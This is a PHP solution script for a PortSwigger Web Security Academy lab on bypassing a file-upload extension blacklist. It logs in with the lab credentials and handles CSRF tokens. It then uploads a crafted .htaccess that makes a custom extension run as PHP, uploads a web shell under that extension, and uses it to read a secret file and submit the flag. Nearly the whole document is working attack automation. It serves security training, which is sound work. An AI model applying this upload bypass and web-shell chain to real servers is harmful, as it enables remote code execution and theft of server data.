<?php

/*  This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter 

Lab link: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass
*/

use GuzzleHttp\Client;

require_once('../vendor/autoload.php');

/*
Get csrf token from html responses to use for future requests

@param string $html_body  An html page response in text form
@return csrf token string
*/
function parse_csrf($html_body) {
    $re = '/type="hidden" name="csrf" value="([A-Za-z0-9]*)">/m';
    preg_match($re, $html_body, $matches) or die('csrf not found' . PHP_EOL);
    return $matches[1];
}

/*
Get csrf token from html responses to use for future requests

@param string $client Established Guzzlehttp instance with base uri
@param string $method REST API verb to use. Default GET
@param string $endpoint uri sub-location. Default root page
@param string $params Guzzlehttp request parameters
@return response from the Guzzlehttp request transmission
*/
function send_request($client, $method = 'GET', $endpoint = '/', $params = array()) {
    return $client->request($method, $endpoint, $params);
}

$lab_id = '0a2f008b04061d498868791600e40026'; // !!!---Change based on lab id----!!!
$uri = 'https://' . $lab_id . '.web-security-academy.net';
$client = new Client([ 'base_uri' => $uri, 'cookies' => true ]); // Establish connection to base lab page, and maintain sessions for requests

//***Need to query the login page to get the csrf token to login */ 
$r1_data = ['endpoint' => '/login'];
$resp_1 = send_request($client, endpoint:$r1_data['endpoint']);

//***Use the csrf token to login as the wiener user***//
$csrf_1 = parse_csrf($resp_1->getBody());
$r2_data = [
    'endpoint' => '/login',
    'params' => [
        'form_params' => [
            'csrf' => $csrf_1,
            'username' => 'wiener',
            'password' => 'peter',
        ]
    ]
];
$resp_2 = send_request($client, 'POST', $r2_data['endpoint'], $r2_data['params']);

//***Extract 2nd csrf token for file upload sumission*//
$csrf_2 =  parse_csrf($resp_2->getBody());

/***To complete this excercise, we need to upload two files, the first will
be a tampered .htaccess file for the server end running apache.
This will map php scripts to another extenstion of our choosing which apache will 
interpret for execution
*/
$r3_data = [
    'endpoint' => '/my-account/avatar',
    'params' => [
        'multipart' => [
            [
                'name'     => 'user',
                'contents' => 'wiener'
            ],
            [
                'name'     => 'avatar',
                'contents' => fopen('.htaccess', 'r'),
                'filename' => '.htaccess', // Use url encoding to put the malicious file 1 directory below, bypassing execution protections
                'headers'  => ['Content-Type' => 'text/plain']
            ],
            [
                'name' => 'csrf',
                'contents' => $csrf_2
            ]
            ],
        'headers'  => ['Accept-Encoding' => 'gzip, deflate, br']
        ]
    ];
$resp_3 = send_request($client, 'POST', $r3_data['endpoint'], $r3_data['params']);

/***Now return to the upload page and upload our malicous php (renamed to contents.l33t) */
$r4_data = ['endpoint' => '/my-account']; //Need to go back to upload enpoint to get csrf token
$resp_4 = send_request($client, endpoint:$r4_data['endpoint']);
$csrf_3 = parse_csrf($resp_4->getBody());

$r5_data = [
    'endpoint' => '/my-account/avatar',
    'params' => [
        'multipart' => [
            [
                'name'     => 'user',
                'contents' => 'wiener'
            ],
            [
                'name'     => 'avatar',
                'contents' => fopen('contents.l33t', 'r'),
                'filename' => 'contents.l33t', 
            ],
            [
                'name' => 'csrf',
                'contents' => $csrf_3
            ]
            ],
        'headers'  => ['Accept-Encoding' => 'gzip, deflate, br']
        ]
    ];
$resp_5 = send_request($client, 'POST', $r5_data['endpoint'], $r5_data['params']);

//***Get the solution flag from the malicous php file we just uploaded */
$r6_data = ['endpoint' => '/files/avatars/contents.l33t'];
$resp_6 = send_request($client, endpoint:$r6_data['endpoint']);
$token = $resp_6->getBody();

//***Submit flag to complete the lab */
$r7_data = [ 
    'endpoint' => '/submitSolution',
    'params' => [
        'body' => 'answer=' . trim($token)
        ]
    ];

$resp_7 = send_request($client, 'POST', $r7_data['endpoint'], $r7_data['params']);
echo $resp_7->getBody() . PHP_EOL . 'done', PHP_EOL;
?>